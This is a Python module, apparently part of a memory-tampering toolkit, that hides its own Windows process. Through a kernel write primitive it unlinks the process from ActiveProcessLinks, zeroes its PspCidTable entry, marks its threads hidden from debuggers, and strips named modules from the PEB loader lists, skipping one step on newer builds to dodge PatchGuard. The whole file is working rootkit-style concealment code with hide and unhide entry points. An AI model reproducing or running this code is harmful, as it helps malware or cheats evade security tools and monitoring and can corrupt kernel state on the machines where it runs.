# -*- coding: utf-8 -*-
"""Kernel-level process concealment via Engine E write capability.

Techniques:
1. DKOM: Unlink EPROCESS from ActiveProcessLinks
2. NtSetInformationThread(HideFromDebugger) on all threads
3. PEB Ldr list cleaning (remove suspicious module entries)
4. PspCidTable entry zeroing (prevent PID-based lookup)
"""

from __future__ import annotations

import ctypes
import ctypes.wintypes
import os
import struct
import threading
from typing import Dict, List, Optional, Tuple

try:
    from mem_probe import rt_io
except Exception:
    rt_io = None  # type: ignore[assignment]

ntdll = ctypes.windll.ntdll
kernel32 = ctypes.windll.kernel32


class CloakMgr:

    def __init__(self) -> None:
        self._active = False
        self._dkom_saved: Optional[Tuple[int, int, int]] = None
        self._cid_saved: Optional[Tuple[int, int]] = None
        self._peb_cleaned = 0
        self._our_pid = os.getpid()
        self._our_ep = 0
        self._our_cr3 = 0
        self._lock = threading.Lock()
        import atexit
        atexit.register(self._atexit_cleanup)

    def _atexit_cleanup(self) -> None:
        if self._active:
            try:
                self.disengage()
            except Exception:
                pass

    @property
    def active(self) -> bool:
        return self._active

    def status(self) -> dict:
        return {
            "active": self._active,
            "dkom": self._dkom_saved is not None,
            "cid": self._cid_saved is not None,
            "peb": self._peb_cleaned > 0,
        }

    # ── Public ─────────────────────────────────────────────────────

    def engage(self) -> dict:
        with self._lock:
            if self._active:
                return self.status()
            if not self._engine_ok():
                return {"error": "write engine unavailable"}
            self._resolve_self()
            self._pin_ep_cache()
            build = self._os_build()
            r = {}
            r["threads"] = self._thread_hide()
            r["peb"] = self._peb_clean()
            if build < 26100:
                r["dkom"] = self._dkom_unlink()
            else:
                r["dkom"] = False
                r["dkom_skip"] = "24H2+ KPP too aggressive"
            r["cid"] = self._cid_hide()
            self._active = any(v for k, v in r.items() if k != "dkom_skip")
            r["os_build"] = build
            return r

    def disengage(self) -> dict:
        with self._lock:
            r = {}
            r["dkom"] = self._dkom_restore()
            r["cid"] = self._cid_restore()
            self._active = False
            return r

    # ── OS detection ────────────────────────────────────────────────

    _cached_build: int = 0

    def _os_build(self) -> int:
        if self._cached_build:
            return self._cached_build
        try:
            ver = ctypes.wintypes.OSVERSIONINFOEXW()
            ver.dwOSVersionInfoSize = ctypes.sizeof(ver)
            ntdll.RtlGetVersion(ctypes.byref(ver))
            self._cached_build = ver.dwBuildNumber
        except Exception:
            self._cached_build = 19041
        return self._cached_build

    # ── Engine ─────────────────────────────────────────────────────

    def _engine_ok(self) -> bool:
        if rt_io is None:
            return False
        try:
            return bool(rt_io.engine_info().get("can_write"))
        except Exception:
            return False

    def _resolve_self(self) -> int:
        if self._our_ep:
            return self._our_ep
        if rt_io is None:
            return 0
        try:
            ep, cr3 = rt_io._r1_fe(self._our_pid)
            if ep:
                self._our_ep = ep
                self._our_cr3 = cr3
            return ep
        except Exception:
            return 0

    def _pin_ep_cache(self) -> None:
        """Pin our (ep, cr3) in rt_io cache with infinite TTL.

        After DKOM unlink, APL walk can't find us anymore.
        Pre-pin ensures _r5_read(own_pid) still works for PEB cleaning.
        """
        if not self._our_ep or rt_io is None:
            return
        try:
            import time
            rt_io._ep_cache[self._our_pid] = (
                self._our_ep, self._our_cr3, time.monotonic() + 1e9
            )
        except Exception:
            pass

    # ── 1. DKOM ────────────────────────────────────────────────────

    def _dkom_unlink(self) -> bool:
        if self._dkom_saved is not None:
            return True
        ep = self._resolve_self()
        if not ep:
            return False
        try:
            off_apl = rt_io._OFF_APL
            if not off_apl:
                rt_io._resolve_ep_offsets()
                off_apl = rt_io._OFF_APL
            if not off_apl:
                return False

            our_apl = ep + off_apl
            flink = rt_io._kr8(our_apl)
            blink = rt_io._kr8(our_apl + 8)
            if not flink or not blink:
                return False
            if flink < 0xFFFF800000000000 or blink < 0xFFFF800000000000:
                return False
            if rt_io._kr8(flink + 8) != our_apl:
                return False
            if rt_io._kr8(blink) != our_apl:
                return False

            self._dkom_saved = (our_apl, flink, blink)

            rt_io._kw(blink, struct.pack("<Q", flink))
            rt_io._kw(flink + 8, struct.pack("<Q", blink))
            rt_io._kw(our_apl, struct.pack("<Q", our_apl))
            rt_io._kw(our_apl + 8, struct.pack("<Q", our_apl))
            return True
        except Exception:
            return False

    def _dkom_restore(self) -> bool:
        if self._dkom_saved is None:
            return True
        try:
            our_apl, orig_flink, blink = self._dkom_saved

            # Validate blink is still a live APL member:
            # walk forward from blink up to 512 hops; if we see orig_flink
            # somewhere in the chain, blink is still valid.
            valid = False
            cur = rt_io._kr8(blink)
            visited = set()
            while cur and cur > 0xFFFF800000000000 and cur not in visited and len(visited) < 512:
                if cur == orig_flink or cur == blink:
                    valid = True
                    break
                visited.add(cur)
                cur = rt_io._kr8(cur)
            if not valid:
                self._dkom_saved = None
                return False

            # Re-insert between blink and whatever blink->Flink is now
            cur_next = rt_io._kr8(blink)
            if not cur_next or cur_next < 0xFFFF800000000000:
                self._dkom_saved = None
                return False
            rt_io._kw(our_apl, struct.pack("<Q", cur_next))
            rt_io._kw(our_apl + 8, struct.pack("<Q", blink))
            rt_io._kw(blink, struct.pack("<Q", our_apl))
            rt_io._kw(cur_next + 8, struct.pack("<Q", our_apl))
            self._dkom_saved = None
            return True
        except Exception:
            return False

    # ── 2. PspCidTable ─────────────────────────────────────────────

    def _find_cid_table(self) -> int:
        try:
            fn_name = "PsLookupProcessByProcessId"
            exports = rt_io._ntos_resolve(fn_name)
            fn_va = exports.get(fn_name, 0)
            if not fn_va:
                return 0
            code = rt_io._r1_r(fn_va, 128, 2)
            if not code:
                return 0
            for pat in (b"\x48\x8B\x0D", b"\x48\x8D\x0D",
                        b"\x4C\x8B\x05", b"\x4C\x8B\x0D"):
                idx = code.find(pat)
                if idx >= 0 and idx + 7 <= len(code):
                    disp = struct.unpack_from("<i", code, idx + 3)[0]
                    ptr = fn_va + idx + 7 + disp
                    table = rt_io._kr8(ptr)
                    if table and table > 0xFFFF800000000000:
                        return table
            return 0
        except Exception:
            return 0

    def _cid_hide(self) -> bool:
        if self._cid_saved is not None:
            return True
        table = self._find_cid_table()
        if not table:
            return False
        try:
            tc = rt_io._kr8(table)
            if not tc:
                return False
            level = tc & 3
            base = tc & ~3
            idx = self._our_pid // 4
            es = 16
            epp = 256

            if level == 0:
                slot = base + idx * es
            elif level == 1:
                l0 = rt_io._kr8(base + (idx // epp) * 8)
                if not l0 or l0 < 0xFFFF800000000000:
                    return False
                slot = l0 + (idx % epp) * es
            elif level == 2:
                l1 = rt_io._kr8(base + (idx // (epp * epp)) * 8)
                if not l1:
                    return False
                rem = idx % (epp * epp)
                l0 = rt_io._kr8(l1 + (rem // epp) * 8)
                if not l0:
                    return False
                slot = l0 + (rem % epp) * es
            else:
                return False

            orig = rt_io._kr8(slot)
            if not orig:
                return False
            self._cid_saved = (slot, orig)
            rt_io._kw(slot, struct.pack("<Q", 0))
            return True
        except Exception:
            return False

    def _cid_restore(self) -> bool:
        if self._cid_saved is None:
            return True
        try:
            slot, orig = self._cid_saved
            rt_io._kw(slot, struct.pack("<Q", orig))
            self._cid_saved = None
            return True
        except Exception:
            return False

    # ── 3. Thread hide ─────────────────────────────────────────────

    def _thread_hide(self) -> bool:
        THDF = 0x11
        count = 0
        try:
            h = kernel32.CreateToolhelp32Snapshot(0x4, 0)
            if h in (-1, 0xFFFFFFFF):
                return False

            class TE(ctypes.Structure):
                _fields_ = [
                    ("dwSize", ctypes.c_ulong),
                    ("cntUsage", ctypes.c_ulong),
                    ("th32ThreadID", ctypes.c_ulong),
                    ("th32OwnerProcessID", ctypes.c_ulong),
                    ("tpBasePri", ctypes.c_long),
                    ("tpDeltaPri", ctypes.c_long),
                    ("dwFlags", ctypes.c_ulong),
                ]

            te = TE()
            te.dwSize = ctypes.sizeof(TE)
            if not kernel32.Thread32First(h, ctypes.byref(te)):
                kernel32.CloseHandle(h)
                return False
            while True:
                if te.th32OwnerProcessID == self._our_pid:
                    th = kernel32.OpenThread(0x20, False, te.th32ThreadID)
                    if th:
                        if ntdll.NtSetInformationThread(th, THDF, None, 0) >= 0:
                            count += 1
                        kernel32.CloseHandle(th)
                if not kernel32.Thread32Next(h, ctypes.byref(te)):
                    break
            kernel32.CloseHandle(h)
            return count > 0
        except Exception:
            return False

    # ── 4. PEB cleaning ────────────────────────────────────────────

    _HIDE_MODS = ("python3", "vcruntime", "_ctypes", "mem_probe", "rt_io", "_sao_cy")

    def _peb_clean(self) -> bool:
        ep = self._resolve_self()
        if not ep:
            return False
        try:
            off_peb = rt_io._OFF_PEB
            if not off_peb:
                return False
            peb = rt_io._kr8(ep + off_peb)
            if not peb:
                return False
            ldr = self._ur8(peb + 0x18)
            if not ldr:
                return False
            n = 0
            n += self._peb_unlink(ldr + 0x10, 0x60, 0)
            n += self._peb_unlink(ldr + 0x20, 0x50, 0x10)
            n += self._peb_unlink(ldr + 0x30, 0x40, 0x20)
            self._peb_cleaned = n
            return n > 0
        except Exception:
            return False

    def _peb_unlink(self, head: int, name_off: int, link_off: int) -> int:
        count = 0
        try:
            flink = self._ur8(head)
            if not flink:
                return 0
            vis, cur = set(), flink
            while cur and cur != head and cur not in vis and len(vis) < 256:
                vis.add(cur)
                base = cur - link_off
                us = self._ur(base + name_off, 16)
                if us and len(us) >= 16:
                    nl = struct.unpack_from("<H", us, 0)[0]
                    nb = struct.unpack_from("<Q", us, 8)[0]
                    if 0 < nl < 520 and nb:
                        raw = self._ur(nb, nl)
                        if raw:
                            try:
                                name = raw.decode("utf-16-le", "replace").lower()
                                if any(s in name for s in self._HIDE_MODS):
                                    nxt = self._ur8(cur)
                                    prv = self._ur8(cur + 8)
                                    if nxt and prv:
                                        self._uw8(prv, nxt)
                                        self._uw8(nxt + 8, prv)
                                        count += 1
                            except Exception:
                                pass
                nxt = self._ur8(cur)
                if not nxt:
                    break
                cur = nxt
        except Exception:
            pass
        return count

    # ── Helpers ────────────────────────────────────────────────────

    def _ur(self, addr: int, size: int):
        try:
            return rt_io._r5_read(self._our_pid, addr, size)
        except Exception:
            return None

    def _ur8(self, addr: int) -> int:
        d = self._ur(addr, 8)
        return struct.unpack("<Q", d)[0] if d and len(d) >= 8 else 0

    def _uw8(self, addr: int, val: int) -> bool:
        try:
            return rt_io._r5_write(self._our_pid, addr, struct.pack("<Q", val))
        except Exception:
            return False


_inst: Optional[CloakMgr] = None


def get_hider() -> CloakMgr:
    global _inst
    if _inst is None:
        _inst = CloakMgr()
    return _inst


def hide() -> dict:
    return get_hider().engage()


def unhide() -> dict:
    return get_hider().disengage()


def is_hidden() -> bool:
    return get_hider().active


def status() -> dict:
    return get_hider().status()
